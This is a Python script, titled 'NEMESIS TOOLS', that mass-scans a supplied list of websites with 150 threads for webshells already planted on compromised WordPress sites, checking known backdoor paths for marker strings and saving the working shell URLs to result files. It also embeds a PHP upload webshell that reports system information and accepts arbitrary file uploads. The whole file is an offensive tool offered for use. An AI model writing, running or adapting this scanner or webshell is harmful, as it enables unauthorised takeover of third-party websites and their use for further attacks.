# -*- coding: utf-8 -*-

import sys

import requests

import re

from multiprocessing.dummy import Pool

from colorama import Fore, init


init(autoreset=True)


# Color definitions

fr = Fore.RED

fc = Fore.CYAN

fw = Fore.WHITE

fg = Fore.GREEN

fm = Fore.MAGENTA


print("""

        NEMESIS TOOLS

""")


shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""


requests.urllib3.disable_warnings()

headers = {

    'Connection': 'keep-alive',

    'Cache-Control': 'max-age=0',

    'Upgrade-Insecure-Requests': '1',

    'User -Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',

    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',

    'referer': 'www.google.com'

}


try:

    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]

except IndexError:

    path = str(sys.argv[0]).split('\\')

    exit('\n  [!] Enter <' + path[-1] + '> <sites.txt>')


def URLdomain(site):

    if site.startswith("http://"):

        site = site.replace("http://", "")

    elif site.startswith("https://"):

        site = site.replace("https://", "")

    pattern = re.compile('(.*)/')

    while re.findall(pattern, site):

        sitez = re.findall(pattern, site)

        site = sitez[0]

    return site


def FourHundredThree(url):

    try:

        url = 'http://' + URLdomain(url)

        check = requests.get(url + '/wp-content/themes/travelscape/json.php', headers=headers, allow_redirects=True, timeout=15)

        if 'MSQ_403' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/MSQ_403.txt', 'a') as f:

                f.write(url + '/wp-content/themes/travelscape/json.php\n')

        else:

            url = 'https://' + URLdomain(url)

            check = requests.get(url + '/wp-content/themes/aahana/json.php', headers=headers, allow_redirects=True, verify=False, timeout=15)

            if 'MSQ_403' in check.content.decode('utf-8'):

                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

                with open('Results/MSQ_403.txt', 'a') as f:

                    f.write(url + '/wp-content/themes/aahana/json.php\n')

            else:

                print(' -| ' + url + ' --> {}[Failed]'.format(fr))

                url = 'http://' + URLdomain(url)


        check = requests.get(url + '/wp-content/themes/travel/issue.php', headers=headers, allow_redirects=True, timeout=15)

        if 'Yanz Webshell!' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/wso.txt', 'a') as f:

                f.write(url + '/wp-content/themes/travel/issue.php\n')

        else:

            url = 'https://' + URLdomain(url)


        check = requests.get(url + '/about.php', headers=headers, allow_redirects=True, timeout=15)

        if 'Yanz Webshell!' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/wso.txt', 'a') as f:

                f.write(url + '/about.php\n')

        else:

            url = 'https://' + URLdomain(url)


        check = requests.get(url + '/wp-content/themes/digital-download/new.php', headers=headers, allow_redirects=True, timeout=15)

        if '#0x2525' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/digital-download.txt', 'a') as f:

                f.write(url + '/wp-content/themes/digital-download/new.php\n')

        else:

            print(' -| ' + url + ' --> {}[Failed]'.format(fr))

            url = 'http://' + URLdomain(url)


        check = requests.get(url + '/epinyins.php', headers=headers, allow_redirects=True, timeout=15)

        if 'Uname:' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/wso.txt', 'a') as f:

                f.write(url + '/epinyins.php\n')

        else:

            print(' -| ' + url + ' --> {}[Failed]'.format(fr))

            url = 'https://' + URLdomain(url)


        check = requests.get(url + '/wp-admin/dropdown.php', headers=headers, allow_redirects=True, verify=False, timeout=15)

        if 'Uname:' in check.content.decode('utf-8'):

            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

            with open('Results/wso.txt', 'a') as f:

                f.write(url + '/wp-admin/dropdown.php\n')

        else:

            url = 'https://' + URLdomain(url)

            check = requests.get(url + '/wp-content/plugins/dummyyummy/wp-signup.php', headers=headers, allow_redirects=True, verify=False, timeout=15)

            if 'Simple Shell' in check.content.decode('utf-8'):

                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))

                with open('Results/dummyyummy.txt', 'a') as f:

                    f.write(url + '/wp-content/plugins/dummyyummy/wp-signup.php\n')

            else:

                print(' -| ' + url + ' --> {}[Failed]'.format(fr))

    except Exception as e:

        print(' -| ' + url + ' --> {}[Failed]'.format(fr))


mp = Pool(150)

mp.map(FourHundredThree, target)

mp.close()

mp.join()


print('\n [!] {}Saved in Results/'.format(fc))